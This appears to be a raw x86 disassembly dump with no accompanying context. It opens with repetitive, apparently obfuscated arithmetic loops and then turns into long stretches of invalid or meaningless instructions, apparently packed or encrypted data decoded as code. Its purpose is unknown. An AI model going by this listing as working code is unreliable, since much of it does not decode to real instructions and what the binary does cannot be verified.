  416cc6:	mov    ebx,DWORD PTR [ebp-0x50]
  416cc9:	add    edx,ecx
  416ccb:	xor    edx,ebx
  416ccd:	mov    DWORD PTR [ebp-0x50],edx
  416cd0:	mov    edx,DWORD PTR [ebp+0x8]
  416cd3:	mov    ebx,DWORD PTR [ebp-0x4c]
  416cd6:	add    edx,edi
  416cd8:	and    edx,ebx
  416cda:	mov    DWORD PTR [ebp-0x4c],edx
  416cdd:	mov    edx,DWORD PTR [ebp+0x8]
  416ce0:	mov    ebx,DWORD PTR [ebp-0x48]
  416ce3:	lea    edx,[ebx+edx*1+0x241fcdf]
  416cea:	mov    DWORD PTR [ebp-0x48],edx
  416ced:	mov    edx,DWORD PTR [ebp+0x8]
  416cf0:	mov    ebx,0xfa5e1524
  416cf5:	sub    ebx,edx
  416cf7:	add    ebx,DWORD PTR [ebp-0x44]
  416cfa:	mov    DWORD PTR [ebp-0x44],ebx
  416cfd:	mov    edx,DWORD PTR [ebp+0x8]
  416d00:	xor    edx,eax
  416d02:	add    edx,esi
  416d04:	jne    0x41492d
  416d0a:	jmp    0x416d97
  416d0f:	mov    edx,DWORD PTR [ebp-0x14]
  416d12:	mov    DWORD PTR [ebp+0x8],edx
  416d15:	jmp    0x416d8a
  416d1a:	mov    edx,DWORD PTR [ebp+0x8]
  416d1d:	mov    ebx,DWORD PTR [ebp-0x8]
  416d20:	xor    edx,eax
  416d22:	xor    ebx,eax
  416d24:	sub    edx,ebx
  416d26:	sub    edx,esi
  416d28:	xor    edx,eax
  416d2a:	mov    DWORD PTR [ebp+0x8],edx
  416d2d:	mov    edx,DWORD PTR [ebp+0x8]
  416d30:	mov    ebx,DWORD PTR [ebp-0x58]
  416d33:	add    edx,0x5708e2
  416d39:	imul   edx,ebx
  416d3c:	mov    DWORD PTR [ebp-0x58],edx
  416d3f:	mov    edx,DWORD PTR [ebp+0x8]
  416d42:	mov    ebx,DWORD PTR [ebp-0x54]
  416d45:	add    edx,0x64f880
  416d4b:	or     edx,ebx
  416d4d:	mov    DWORD PTR [ebp-0x54],edx
  416d50:	mov    edx,DWORD PTR [ebp+0x8]
  416d53:	mov    ebx,DWORD PTR [ebp-0x50]
  416d56:	add    edx,ecx
  416d58:	xor    edx,ebx
  416d5a:	mov    DWORD PTR [ebp-0x50],edx
  416d5d:	mov    edx,DWORD PTR [ebp+0x8]
  416d60:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d63:	add    edx,edi
  416d65:	and    edx,ebx
  416d67:	mov    DWORD PTR [ebp-0x4c],edx
  416d6a:	mov    edx,DWORD PTR [ebp+0x8]
  416d6d:	mov    ebx,DWORD PTR [ebp-0x48]
  416d70:	lea    edx,[ebx+edx*1+0x241fcdf]
  416d77:	mov    DWORD PTR [ebp-0x48],edx
  416d7a:	mov    edx,DWORD PTR [ebp+0x8]
  416d7d:	mov    ebx,0xfa5e1524
  416d82:	sub    ebx,edx
  416d84:	add    ebx,DWORD PTR [ebp-0x44]
  416d87:	mov    DWORD PTR [ebp-0x44],ebx
  416d8a:	mov    edx,DWORD PTR [ebp+0x8]
  416d8d:	xor    edx,eax
  416d8f:	add    edx,esi
  416d91:	jne    0x416d1a
  416d97:	mov    edx,DWORD PTR [ebp-0x14]
  416d9a:	mov    DWORD PTR [ebp+0x8],edx
  416d9d:	jmp    0x419172
  416da2:	mov    edx,DWORD PTR [ebp+0x8]
  416da5:	mov    ebx,DWORD PTR [ebp-0x8]
  416da8:	xor    edx,eax
  416daa:	xor    ebx,eax
  416dac:	sub    edx,ebx
  416dae:	sub    edx,esi
  416db0:	xor    edx,eax
  416db2:	mov    DWORD PTR [ebp+0x8],edx
  416db5:	mov    edx,DWORD PTR [ebp+0x8]
  416db8:	mov    ebx,DWORD PTR [ebp-0x58]
  416dbb:	add    edx,0x5708e2
  416dc1:	imul   edx,ebx
  416dc4:	mov    DWORD PTR [ebp-0x58],edx
  416dc7:	mov    edx,DWORD PTR [ebp+0x8]
  416dca:	mov    ebx,DWORD PTR [ebp-0x54]
  416dcd:	add    edx,0x64f880
  416dd3:	or     edx,ebx
  416dd5:	mov    DWORD PTR [ebp-0x54],edx
  416dd8:	mov    edx,DWORD PTR [ebp+0x8]
  416ddb:	mov    ebx,DWORD PTR [ebp-0x50]
  416dde:	add    edx,ecx
  416de0:	xor    edx,ebx
  416de2:	jmp    0x419142
  416de7:	adc    eax,0xa46b3bce
  416dec:	xchg   BYTE PTR ds:0xd7812f8a,al
  416df2:	add    cl,ch
  416df4:	pop    ss
  416df5:	fisub  WORD PTR [eax+0x74]
  416df8:	inc    ebp
  416df9:	add    BYTE PTR [ebx-0x7c7ca1c2],0xb7
  416e00:	xor    ebp,eax
  416e02:	jp     0x416de0
  416e04:	scas   eax,DWORD PTR es:[edi]
  416e05:	sub    DWORD PTR [edx-0x16],esi
  416e08:	mov    ecx,0xa0dd2e87
  416e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e0e:	jle    0x416e13
  416e10:	push   esi
  416e11:	add    ebx,DWORD PTR [esi]
  416e13:	inc    ebp
  416e14:	lods   eax,DWORD PTR ds:[esi]
  416e15:	(bad)  
  416e17:	into   
  416e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e19:	pop    ebp
  416e1a:	test   ah,0x56
  416e1d:	jb     0x416df1
  416e1f:	sbb    dl,0x3a
  416e22:	arpl   WORD PTR [edi],bp
  416e24:	adc    DWORD PTR [ebp+edx*2-0x47],esp
  416e28:	adc    BYTE PTR [edi+0x36],dh
  416e2b:	sub    dl,BYTE PTR [ebp+0x1dd54825]
  416e31:	inc    edi
  416e32:	repnz mov ecx,0x4cccca12
  416e38:	or     BYTE PTR [edi+0x79],dh
  416e3b:	and    eax,0xcfc2f419
  416e40:	xchg   ebp,eax
  416e41:	cmp    DWORD PTR [esi],ebx
  416e43:	ins    DWORD PTR es:[edi],dx
  416e44:	push   ss
  416e45:	inc    ebp
  416e46:	jae    0x416ec5
  416e48:	ret    0xc889
  416e4b:	jge    0x416e36
  416e4d:	lods   eax,DWORD PTR ds:[esi]
  416e4e:	push   ebp
  416e4f:	mov    WORD PTR [eax],es
  416e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e52:	adc    dl,dh
  416e54:	call   0xa5e7:0x15b4346e
  416e5b:	pop    edi
  416e5c:	jg     0x416e6a
  416e5e:	js     0x416edc
  416e60:	icebp  
  416e61:	lods   al,BYTE PTR ds:[esi]
  416e62:	jne    0x416e5e
  416e64:	int3   
  416e65:	pop    esp
  416e66:	mov    fs,WORD PTR [esi]
  416e68:	inc    ebp
  416e69:	lea    edi,[edx+ebp*8+0x56]
  416e6d:	add    edi,eax
  416e6f:	mov    dl,0x32
  416e71:	sub    ebx,DWORD PTR [esi]
  416e73:	pop    es
  416e74:	bnd ret 0x3b35
  416e78:	dec    ecx
  416e79:	shl    BYTE PTR [esi],0x8f
  416e7c:	jne    0x416e3f
  416e7e:	push   ebx
  416e7f:	shl    BYTE PTR [edx],1
  416e81:	ins    DWORD PTR es:[edi],dx
  416e82:	js     0x416e08
  416e84:	and    al,0xdd
  416e86:	cmc    
  416e87:	cwde   
  416e88:	mov    bh,0xec
  416e8a:	adc    eax,0xec5a07e4
  416e8f:	pusha  
  416e90:	and    BYTE PTR [ebx+0x18],cl
  416e93:	aas    
  416e94:	mov    al,ds:0xa058762a
  416e99:	repnz xchg edi,eax
  416e9b:	inc    esi
  416e9c:	sbb    DWORD PTR [edx-0x26381eef],ecx
  416ea2:	jp     0x416f00
  416ea4:	mov    dh,0xfe
  416ea6:	retf   0x672b
  416ea9:	aaa    
  416eaa:	push   es
  416eab:	mov    ebp,0xc2681e4
  416eb0:	or     DWORD PTR [esp+esi*8],eax
  416eb3:	add    al,0x2e
  416eb5:	jecxz  0x416eb0
  416eb7:	mov    dl,0x9d
  416eb9:	fucom  st(5)
  416ebb:	jle    0x416f2e
  416ebd:	or     bh,BYTE PTR [edi]
  416ebf:	rcl    BYTE PTR [eax-0x3a53dfed],1
  416ec5:	pop    eax
  416ec6:	call   0xcc38:0x7ce9fe1
  416ecd:	in     al,dx
  416ece:	dec    edi
  416ecf:	popf   
  416ed0:	adc    DWORD PTR [edx+0x11],esi
  416ed3:	leave  
  416ed4:	or     BYTE PTR [ecx+ecx*1-0x1f],0xe0
  416ed9:	xchg   ebx,eax
  416eda:	add    ebp,DWORD PTR [edi]
  416edc:	lea    esp,[eax+0x7a]
  416edf:	mov    ebx,ss
  416ee1:	dec    esi
  416ee2:	mov    ecx,0xed801168
  416ee7:	jg     0x416eec
  416ee9:	aaa    
  416eea:	jbe    0x416eb1
  416eec:	(bad)  
  416eee:	fidiv  DWORD PTR [eax-0x62]
  416ef1:	stos   BYTE PTR es:[edi],al
  416ef2:	dec    ebx
  416ef3:	mov    eax,0x1cd8377d
  416ef8:	jns    0x416f4a
  416efa:	into   
  416efb:	mov    al,ds:0x9e4b41
  416f00:	inc    eax
  416f01:	adc    BYTE PTR [eax],bh
  416f03:	fisttp WORD PTR [eax-0x2d]
  416f06:	mov    ecx,0xe76787d5
  416f0b:	cmovs  eax,DWORD PTR [edi+ebx*1+0x6f]
  416f10:	inc    ebp
  416f11:	push   ebp
  416f12:	xor    edx,ecx
  416f14:	xor    BYTE PTR [edi+0x5fe14eb],0x13
  416f1b:	jmp    FWORD PTR [ebx]
  416f1d:	ja     0x416ed3
  416f1f:	mov    cl,0xb8
  416f21:	leave  
  416f22:	bound  edi,QWORD PTR [edx+0x75]
  416f25:	mov    BYTE PTR [esi+0x7c],bl
  416f28:	cmp    edi,esi
  416f2a:	jg     0x416ec2
  416f2c:	fs cli 
  416f2e:	inc    ecx
  416f2f:	inc    edi
  416f30:	sbb    BYTE PTR [ecx],dl
  416f32:	mov    eax,ds:0xf69f9da9
  416f37:	std    
  416f38:	or     BYTE PTR [ecx-0x498cbb92],dh
  416f3e:	mov    dl,0x40
  416f40:	dec    eax
  416f41:	inc    ebp
  416f42:	fisubr WORD PTR [ebx+0x3cda19c4]
  416f48:	pop    ds
  416f49:	inc    edi
  416f4a:	cmp    eax,0x7860dcbc
  416f4f:	nop
  416f50:	mov    ds:0x9dcb45c7,al
  416f55:	and    dl,cl
  416f57:	or     ah,ch
  416f59:	add    al,0x57
  416f5b:	dec    edi
  416f5c:	test   DWORD PTR [eax+0x10],edx
  416f5f:	mov    al,0xd3
  416f61:	dec    ebx
  416f62:	and    DWORD PTR [edi-0x3],0x7b
  416f66:	mov    edx,0xea74398b
  416f6b:	cmp    esp,DWORD PTR [ebp+0x32]
  416f6e:	cmp    BYTE PTR [ecx-0x20991cc4],cl
  416f74:	sub    eax,0x28378d02
  416f79:	and    al,0x23
  416f7b:	jne    0x416fbc
  416f7d:	out    0xfa,al
  416f7f:	icebp  
  416f80:	dec    ecx
  416f81:	xor    ecx,DWORD PTR [edx]
  416f83:	pop    edx
  416f84:	addr16 adc eax,0x4020c4b9
  416f8a:	mov    al,0xcc
  416f8c:	cmp    ch,BYTE PTR ds:0xeadf5d7e
  416f92:	cmp    eax,0x770b5b1f
  416f97:	mov    ah,0xf7
  416f99:	mov    ebx,0x84f2be45
  416f9e:	xor    eax,0x76d60794
  416fa3:	test   al,0x61
  416fa5:	out    dx,eax
  416fa6:	jo     0x416f73
  416fa8:	das    
  416fa9:	(bad)  
  416faa:	cld    
  416fab:	aam    0xec
  416fad:	sub    ah,BYTE PTR [ecx+eiz*8]
  416fb0:	xchg   WORD PTR [esi],cx
  416fb3:	dec    esi
  416fb4:	adc    BYTE PTR ds:0x9b537bff,ah
  416fba:	fnstsw WORD PTR [ebx-0x55]
  416fbd:	add    BYTE PTR [edi+0x7d],cl
  416fc0:	mov    eax,ds:0x9e34afe5
  416fc5:	mov    esp,edi
  416fc7:	xor    BYTE PTR [ecx-0x3d3c7733],0x2e
  416fce:	retf   
  416fcf:	in     eax,0xaa
  416fd1:	sub    BYTE PTR [ebx+0x3f],bh
  416fd4:	test   al,0x3
  416fd6:	in     al,dx
  416fd7:	and    eax,0x323a108c
  416fdc:	jno    0x417011
  416fde:	and    ebp,DWORD PTR [edi-0x2]
  416fe1:	outs   dx,BYTE PTR ds:[esi]
  416fe2:	ss or  bl,dh
  416fe5:	push   edx
  416fe6:	test   DWORD PTR [eax],ebp
  416fe8:	in     eax,dx
  416fe9:	add    eax,DWORD PTR [ecx+0x75]
  416fec:	les    ebx,FWORD PTR [eax+ecx*8+0x2b0f4783]
  416ff3:	cmp    DWORD PTR [ebx+ecx*1+0x23],edi
  416ff7:	pop    edi
  416ff8:	aam    0x33
  416ffa:	adc    DWORD PTR [ecx-0x74e1dafa],ebp
  417000:	dec    esi
  417001:	xchg   esi,eax
  417002:	mov    WORD PTR [ebp-0x61],?
  417005:	test   eax,0xf44f04cf
  41700a:	add    dh,BYTE PTR [esi]
  41700c:	(bad)  
  41700e:	(bad)  
  41700f:	jno    0x417077
  417011:	pop    eax
  417012:	push   ebp
  417013:	test   ecx,ebx
  417015:	sub    al,0xc8
  417017:	sbb    al,0xb5
  417019:	imul   ebp,DWORD PTR [edi+0x7f8f53af],0xffffff99
  417020:	mov    ebx,0xd410b061
  417025:	push   ebx
  417026:	xor    al,0x3
  417028:	gs in  eax,dx
  41702a:	adc    eax,edi
  41702c:	xchg   DWORD PTR [ecx-0x5c],edi
  41702f:	mov    cs,WORD PTR [ebx]
  417031:	xor    ecx,esp
  417033:	cmp    al,0xc0
  417035:	icebp  
  417036:	inc    ecx
  417037:	(bad)  [ebx+0x2239b423]
  41703d:	(bad)  
  41703e:	idiv   BYTE PTR ds:0xd83e7c49
  417044:	inc    esp
  417045:	loop   0x41708b
  417047:	push   es
  417048:	lods   al,BYTE PTR ds:[esi]
  417049:	ret    
  41704a:	inc    edi
  41704b:	arpl   WORD PTR [edi],bp
  41704d:	push   ds
  41704e:	and    al,0xc3
  417050:	retf   
  417051:	outs   dx,DWORD PTR ds:[esi]
  417052:	div    BYTE PTR [edx+0x65]
  417055:	xchg   ebp,eax
  417056:	pop    ebp
  417057:	push   ds
  417058:	ror    BYTE PTR [edi],0xec
  41705b:	fwait
  41705c:	cmp    BYTE PTR [esp+ecx*2],dh
  41705f:	pop    es
  417060:	sub    BYTE PTR ds:0xbb48757,bh
  417066:	mov    ds,ecx
  417068:	inc    eax
  417069:	es fist DWORD PTR cs:[bx+si]
  41706e:	outs   dx,DWORD PTR ds:[esi]
  41706f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417070:	sbb    al,0xeb
  417072:	fiadd  WORD PTR ds:0xdcb120d
  417078:	cwde   
  417079:	repz jp 0x417002
  41707c:	out    0xa5,al
  41707e:	fadd   QWORD PTR [eax]
  417080:	or     DWORD PTR [ecx+edi*1],ebx
  417083:	fucomip st,st(2)
  417085:	jl     0x4170d6
  417087:	jo     0x41703a
  417089:	aaa    
  41708a:	mov    ds:0x47b73929,eax
  41708f:	repz idiv DWORD PTR [edx+0x75bb6de5]
  417096:	clc    
  417097:	dec    esp
  417098:	cmp    bl,dh
  41709a:	xchg   esp,eax
  41709b:	cmp    BYTE PTR [edi+0x77],0xa7
  41709f:	shl    DWORD PTR [esi+ebx*1+0x7c],cl
  4170a3:	xor    BYTE PTR [esp+edx*8],bh
  4170a6:	(bad)  
  4170a7:	aaa    
  4170a8:	or     eax,0x2cbcc39e
  4170ad:	je     0x417037
  4170af:	test   BYTE PTR [eax],ch
  4170b1:	call   0x57a101ff
  4170b6:	fs add al,0x49
  4170b9:	xchg   esp,eax
  4170ba:	stc    
  4170bb:	xchg   esi,eax
  4170bc:	push   ss
  4170bd:	fisttp QWORD PTR [ecx-0x66e78777]
  4170c3:	inc    ebp
  4170c4:	lods   al,BYTE PTR ds:[esi]
  4170c5:	mov    gs,esp
  4170c7:	xchg   esp,eax
  4170c8:	mov    ebp,0xfee82b82
  4170cd:	cmp    al,0x5b
  4170cf:	cmp    DWORD PTR [ebp+0x25a346c7],ebp
  4170d5:	push   ecx
  4170d6:	pslld  mm7,QWORD PTR [esi-0x54]
  4170da:	cdq    
  4170db:	iret   
  4170dc:	xor    BYTE PTR ds:0x349eaeab,al
  4170e2:	push   eax
  4170e3:	pop    eax
  4170e4:	out    dx,al
  4170e5:	jae    0x41715f
  4170e7:	mov    bl,0xb2
  4170e9:	or     esp,DWORD PTR [ebp-0x78]
  4170ec:	add    ch,BYTE PTR [edx+eiz*2]
  4170ef:	or     al,cl
  4170f1:	cwde   
  4170f2:	lea    edx,[eax+0x3f]
  4170f5:	lods   eax,DWORD PTR ds:[esi]
  4170f6:	push   esp
  4170f7:	adc    bh,ah
  4170f9:	mov    edx,0xb11153ac
  4170fe:	pop    eax
  4170ff:	sbb    eax,0xd01e4829
  417104:	outs   dx,BYTE PTR ds:[esi]
  417105:	jmp    0x2f8f:0xf1cdf037
  41710c:	or     dh,0x5a
  41710f:	xor    edi,0xbef4edf6
  417115:	iret   
  417116:	pop    edx
  417117:	rol    cl,0xae
  41711a:	pusha  
  41711b:	adc    dh,BYTE PTR [ecx-0x2bb12576]
  417121:	pop    esi
  417122:	fistp  WORD PTR [ebp+0x452a1a55]
  417128:	fs cmp eax,0xbaf0bb21
  41712e:	push   0x44
  417130:	pop    ebp
  417131:	(bad)  
  417132:	fadd   DWORD PTR [esi-0x154a76d8]
  417138:	ss xor al,0xde
  41713b:	call   0xdc71:0xa336c5d
  417142:	push   eax
  417143:	push   cs
  417144:	xchg   ebp,eax
  417145:	inc    edx
  417146:	add    ebp,DWORD PTR [eax-0x11513f11]
  41714c:	test   eax,0xafaf4a26
  417151:	lahf   
  417152:	jecxz  0x4171d0
  417154:	dec    esi
  417155:	inc    DWORD PTR [edx+ebx*2-0x3eee8c9b]
  41715c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41715d:	or     esp,DWORD PTR [ebp+0x10]
  417160:	pop    ds
  417161:	test   eax,0xb3ac3649
  417166:	loope  0x41711e
  417168:	repz xor esi,0x33
  41716c:	fisubr WORD PTR [edx-0x76fcd1ef]
  417172:	cmp    bh,0xab
  417175:	adc    eax,0x40237f90
  41717a:	push   esp
  41717b:	into   
  41717c:	test   DWORD PTR [ebx+0x134ca848],ebx
  417182:	daa    
  417183:	loopne 0x4171a1
  417185:	stc    
  417186:	(bad)  
  417187:	mov    esp,0xfb7d3fc
  41718c:	jecxz  0x4171c7
  41718e:	pop    ebx
  41718f:	pop    eax
  417190:	daa    
  417191:	sbb    eax,ecx
  417193:	imul   DWORD PTR [eax-0x45]
  417196:	out    0x78,eax
  417198:	add    DWORD PTR [ebp+0x76],ecx
  41719b:	and    DWORD PTR [eax],edx
  41719d:	mov    ds:0x50c54a4e,al
  4171a2:	cli    
  4171a3:	mov    ds:0xbdf8b933,al
  4171a8:	add    al,0xfd
  4171aa:	mov    eax,ds:0xc38e5b2b
  4171af:	aam    0x8f
  4171b1:	sbb    BYTE PTR [edi],al
  4171b3:	ror    BYTE PTR [esi+0x2d],0x78
  4171b7:	and    cl,BYTE PTR [eax]
  4171b9:	nop
  4171ba:	sub    BYTE PTR [ecx+eiz*4-0x29],0x59
  4171bf:	add    ch,BYTE PTR [edx+0x33]
  4171c2:	push   esi
  4171c3:	fiadd  DWORD PTR [edi]
  4171c5:	push   es
  4171c6:	jb     0x417205
  4171c8:	out    0x8f,al
  4171ca:	mov    eax,0x34409f37
  4171cf:	push   ebx
  4171d0:	in     eax,dx
  4171d1:	adc    al,0x6e
  4171d3:	mov    esp,0x69eeda91
  4171d8:	std    
  4171d9:	pop    edi
  4171da:	mov    dh,0x66
  4171dc:	rcl    BYTE PTR [esi],cl
  4171de:	pop    ebx
  4171df:	clc    
  4171e0:	ss lahf 
  4171e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171e3:	xchg   ebp,eax
  4171e4:	mov    dl,0xb7
  4171e6:	pop    edx
  4171e7:	clc    
  4171e8:	push   ds
  4171e9:	push   es
  4171ea:	cli    
  4171eb:	retf   
  4171ec:	sbb    ebp,DWORD PTR ds:0x42d1054b
  4171f2:	ins    DWORD PTR es:[edi],dx
  4171f3:	dec    esi
  4171f5:	xchg   DWORD PTR [esi],ecx
  4171f7:	adc    ch,bl
  4171f9:	not    bl
  4171fb:	(bad)  
  4171fc:	ret    0x7c54
  4171ff:	fs test al,0xda
  417202:	mov    edx,edi
  417204:	pop    ebp
  417205:	add    BYTE PTR [esi-0x4a3578ea],dh
  41720b:	add    al,0x4f
  41720d:	dec    ebx
  41720e:	shl    BYTE PTR [ebp-0x40786256],0xd2
  417215:	jp     0x4171c4
  417217:	stos   DWORD PTR es:[edi],eax
  417218:	xchg   edi,eax
  417219:	mov    ss,WORD PTR [edi]
  41721b:	ret    0xe280
  41721e:	outs   dx,DWORD PTR ds:[esi]
  41721f:	cwde   
  417220:	scas   eax,DWORD PTR es:[edi]
  417221:	mov    bh,0xeb
  417223:	in     eax,0x2b
  417225:	sbb    cl,cl
  417227:	shr    DWORD PTR [eax],0x77
  41722a:	scas   eax,DWORD PTR es:[edi]
  41722b:	iret   
  41722c:	leave  
  41722d:	fsubr  QWORD PTR [ebp+0x76]
  417230:	mov    al,0xdb
  417232:	out    dx,eax
  417233:	mov    ebp,0xbee60b7d
  417238:	out    0x38,eax
  41723a:	dec    ebp
  41723b:	aas    
  41723c:	fadd   st,st(1)
  41723e:	push   ss
  41723f:	into   
  417240:	mov    al,0x5a
  417242:	ret    0x2c1d
  417245:	sub    al,0x49
  417247:	jecxz  0x4171d9
  417249:	aam    0xcb
  41724b:	mov    ds:0xea8905,eax
  417250:	jecxz  0x4172ca
  417252:	sbb    eax,0x801b8a89
  417257:	lods   eax,DWORD PTR ds:[esi]
  417258:	push   esp
  417259:	aad    0xa9
  41725b:	adc    bl,BYTE PTR [eax+0xe]
  41725e:	sbb    esi,ebx
  417260:	fs data16 jp 0x417220
  417264:	xchg   edi,eax
  417265:	mov    ebp,0xb3d01924
  41726a:	pop    es
  41726b:	data16 (bad) 
  41726d:	xor    eax,0xf036d200
  417272:	sub    al,0xb7
  417274:	ds in  al,0xbb
  417277:	cmp    al,0x78
  417279:	cmp    al,cl
  41727b:	jb     0x41725e
  41727d:	xchg   ebp,eax
  41727e:	(bad)  
  417280:	test   BYTE PTR [ebx-0x38],al
  417283:	cs jle 0x417244
  417286:	jmp    0x9d4e0528
  41728b:	xor    DWORD PTR [ebp+0x51],esp
  41728e:	jb     0x41724b
  417290:	lods   eax,DWORD PTR ds:[esi]
  417291:	jl     0x417284
  417293:	dec    ebx
  417294:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417295:	out    dx,eax
  417296:	std    
  417297:	in     eax,dx
  417298:	cmp    ecx,esi
  41729a:	popf   
  41729b:	inc    edx
  41729c:	pop    es
  41729d:	cld    
  41729e:	sub    al,0x77
  4172a0:	mov    ecx,?
  4172a2:	icebp  
  4172a3:	stos   BYTE PTR es:[edi],al
  4172a4:	fadd   st,st(5)
  4172a6:	test   esi,esi
  4172a8:	mov    al,0x7d
  4172aa:	mov    WORD PTR [ebx-0x7d],?
  4172ad:	stos   BYTE PTR es:[edi],al
  4172ae:	jne    0x417280
  4172b0:	push   fs
  4172b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172b3:	mov    BYTE PTR [edx],cl
  4172b5:	mov    bl,0x53
  4172b7:	out    0xb6,eax
  4172b9:	jecxz  0x41723e
  4172bb:	push   eax
  4172bc:	(bad)
  4172bf:	mov    es:0x4bb6af93,eax
  4172c5:	or     al,0x7c
  4172c7:	(bad)  
  4172c8:	fnstenv [esi+0x626601d0]
  4172ce:	or     cl,dl
  4172d0:	cmp    DWORD PTR [ecx],edx
  4172d2:	mov    ds:0x5dc7a81,eax
  4172d7:	leave  
  4172d8:	lods   al,BYTE PTR ds:[esi]
  4172d9:	mov    edi,ebx
  4172db:	sub    eax,0x49e3cbd5
  4172e0:	rcr    DWORD PTR [ecx],0x16
  4172e3:	es leave 
  4172e5:	and    dl,BYTE PTR [esi+0x69]
  4172e8:	add    edx,eax
  4172ea:	leave  
  4172eb:	(bad)  
  4172ec:	neg    BYTE PTR [ecx+0x1575ff2b]
  4172f2:	iret   
  4172f3:	and    ah,ch
  4172f5:	add    BYTE PTR [edx],0x5f
  4172f8:	jp     0x41727e
  4172fa:	dec    edi
  4172fb:	xlat   BYTE PTR ds:[ebx]
  4172fc:	jae    0x4172fe
  4172fe:	cmp    eax,0xdabd1f6c
  417303:	jmp    DWORD PTR [ebp-0x3b33f6e8]
  417309:	xchg   ecx,ecx
  41730b:	loop   0x4172b4
  41730d:	daa    
  41730e:	jge    0x417376
  417310:	push   es
  417311:	or     al,BYTE PTR [ebx]
  417313:	inc    ecx
  417314:	rcr    BYTE PTR [ecx+ebx*4],0xb
  417318:	mov    ebp,0xb55857cc
  41731d:	push   cs
  41731e:	mov    ebp,0x9103615b
  417323:	ins    BYTE PTR es:[edi],dx
  417324:	mov    esi,eax
  417326:	lahf   
  417327:	scas   al,BYTE PTR es:[edi]
  417328:	fidiv  WORD PTR [ebx]
  41732a:	dec    ebx
  41732b:	dec    esi
  41732c:	out    0x83,eax
  41732e:	popa   
  41732f:	cmp    eax,0x809c0184
  417334:	push   esi
  417335:	sub    al,0xf
  417337:	xchg   ecx,edi
  417339:	pop    esi
  41733a:	shl    eax,cl
  41733c:	int3   
  41733d:	inc    esi
  41733e:	call   0xca8c:0xe6e84af2
  417345:	inc    ecx
  417346:	cmp    DWORD PTR [eax+eiz*2-0x634d39c3],ebx
  41734d:	jno    0x41733b
  41734f:	arpl   WORD PTR [edi+ecx*8],sp
  417352:	inc    ebp
  417353:	jmp    0x3ab5:0x64bbe586
  41735a:	lods   al,BYTE PTR ds:[esi]
  41735b:	mov    esi,edx
  41735d:	psubsw mm0,QWORD PTR [eax]
  417360:	mov    dl,0xf
  417362:	les    esi,FWORD PTR [ecx*2-0x55155c1e]
  417369:	loope  0x4173d3
  41736b:	mov    cl,0xc2
  41736d:	(bad)
  417370:	push   ecx
  417371:	leave  
  417372:	xor    ch,dl
  417374:	pmaxub mm0,QWORD PTR [eax+eax*8]
  417378:	dec    edx
  417379:	jns    0x417376
  41737b:	mov    cl,0x45
  41737d:	sub    BYTE PTR [ebx-0x7185beba],dl
  417383:	idiv   ch
  417385:	mov    ebp,0xabf717d4
  41738a:	adc    edx,DWORD PTR [edx]
  41738c:	cmp    BYTE PTR [edi],dh
  41738e:	jmp    0x834:0xe43df0c2
  417395:	dec    edx
  417396:	sbb    DWORD PTR [edi+ebp*4-0x3a],ebp
  41739a:	pusha  
  41739b:	push   cs
  41739c:	sahf   
  41739d:	push   0xca006749
  4173a2:	pop    edi
  4173a3:	cmc    
  4173a4:	sub    al,0xcd
  4173a6:	xchg   esp,eax
  4173a7:	adc    bh,bl
  4173a9:	imul   eax,ebx,0x49
  4173ac:	pop    ecx
  4173ad:	es jo  0x4173e5
  4173b0:	jmp    0x8c0f:0x662378c9
  4173b7:	jns    0x41740f
  4173b9:	aaa    
  4173ba:	add    al,0x7e
  4173bc:	call   edx
  4173be:	ret    0x9757
  4173c1:	enter  0x93d5,0xde
  4173c5:	shl    BYTE PTR [ebx+0x71934524],1
  4173cb:	pop    es
  4173cc:	fwait
  4173cd:	stos   DWORD PTR es:[edi],eax
  4173ce:	in     al,dx
  4173cf:	sbb    esi,DWORD PTR [edi-0x1c]
  4173d2:	mov    ebp,0xf62c1520
  4173d7:	(bad)  
  4173d8:	dec    edx
  4173d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173da:	push   ebp
  4173db:	push   ds
  4173dc:	or     al,0x5e
  4173de:	mov    dh,BYTE PTR [edi+0x2f]
  4173e1:	add    cl,dl
  4173e3:	pop    ecx
  4173e4:	cli    
  4173e5:	retf   0x428a
  4173e8:	(bad)  
  4173ea:	pop    edx
  4173eb:	aaa    
  4173ec:	pop    ebx
  4173ed:	sti    
  4173ee:	push   0x1004eef4
  4173f3:	or     DWORD PTR [esi],ebp
  4173f5:	ins    DWORD PTR es:[edi],dx
  4173f6:	sbb    DWORD PTR [esi],ebx
  4173f8:	lahf   
  4173f9:	adc    eax,0xfc8b4e1a
  4173fe:	mov    edx,DWORD PTR [ebp-0x4c8cc498]
  417404:	adc    DWORD PTR [ecx+eiz*4],esi
  417407:	imul   edx,edx,0x2b
  41740a:	int    0xa2
  41740c:	ins    DWORD PTR es:[edi],dx
  41740d:	adc    BYTE PTR [eax+0x46c5bd0f],dh
  417413:	xor    bl,BYTE PTR [ebx]
  417415:	arpl   bp,bx
  417417:	repnz push es
  417419:	mov    bh,0x1
  41741b:	(bad)  
  41741c:	ss pop eax
  41741e:	rcl    DWORD PTR [esi+ecx*8-0x55330de6],0xca
  417426:	ret    
  417427:	test   BYTE PTR [eax+0x7e],cl
  41742a:	pop    ecx
  41742b:	inc    edi
  41742c:	mov    ds:0xf3c08def,eax
  417431:	xor    DWORD PTR [eax+0x13],ecx
  417434:	out    dx,eax
  417435:	lea    ebp,[edx]
  417437:	(bad)  
  417438:	mov    eax,ds:0xac5df56b
  41743d:	lahf   
  41743e:	xor    ch,dh
  417440:	sub    eax,0x72ee35a8
  417445:	sbb    BYTE PTR [ebp-0x7c],dh
  417448:	add    bl,BYTE PTR [edi]
  41744a:	dec    edx
  41744b:	fstp   st(5)
  41744d:	not    DWORD PTR [ebx-0x783fa8d2]
  417453:	sub    ecx,ebp
  417455:	pop    es
  417456:	jo     0x417436
  417458:	sub    eax,0xf7232991
  41745d:	popf   
  41745e:	xchg   esi,eax
  41745f:	sub    bl,dh
  417461:	daa    
  417462:	dec    ebp
  417463:	cmp    DWORD PTR [edi+0x232abd98],ecx
  417469:	int    0xa5
  41746b:	sub    bl,dl
